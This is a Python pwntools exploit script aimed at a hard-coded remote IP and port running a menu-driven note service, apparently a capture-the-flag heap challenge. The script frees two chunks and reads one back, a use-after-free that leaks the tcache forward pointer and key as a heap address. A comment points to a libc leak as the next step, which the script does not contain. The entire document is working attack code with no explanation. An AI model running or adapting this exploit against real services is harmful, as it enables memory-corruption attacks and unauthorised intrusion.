from pwn import *
import struct

context.log_level='error'
HOST='52.76.96.108'; PORT=9005

p=remote(HOST,PORT)
p.recvuntil(b'> ')

def create(idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    p.send(data)
    out=p.recvuntil(b'> ', timeout=2)
    return out

def edit(idx, data):
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    p.send(data)
    return p.recvuntil(b'> ', timeout=2)

def readn(idx):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    return p.recvuntil(b'> ', timeout=2)

def delete(idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    return p.recvuntil(b'> ', timeout=2)

# heap leak via tcache double
create(0,0x30,b'A'*0x2f+b'\n')
create(1,0x30,b'B'*0x2f+b'\n')
delete(0)
delete(1)
r=readn(1)
print("read1:", r)
idx=r.find(b'data: ')
data=r[idx+6:r.find(b'\n',idx)]
print("data:", data.hex())
print("fd=",hex(struct.unpack('<Q',data[:8])[0]))
print("key=",hex(struct.unpack('<Q',data[8:16])[0]))

# try large chunk for libc
p.close()
